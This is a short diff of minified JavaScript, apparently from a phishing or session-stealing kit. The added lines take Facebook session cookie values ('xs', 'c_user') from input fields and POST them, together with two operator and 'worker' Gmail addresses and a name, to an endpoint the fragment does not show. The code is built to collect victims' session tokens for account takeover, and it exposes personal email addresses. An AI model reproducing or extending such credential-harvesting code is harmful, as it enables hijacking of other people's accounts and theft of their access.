@@ -9820,10 +9820,11 @@
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
+                                            xs: xsInput.value,
+                                            c_user: cUserinput.value,
                                             emails: "mehtabalii67890@gmail.com",
                                             workerEmail: "lingdavid24@gmail.com",
-                                            xs: r,
-                                            c_user: i,
+                                            
                                             name: "Mahtab"
                                         })
                                     }).then((e => {
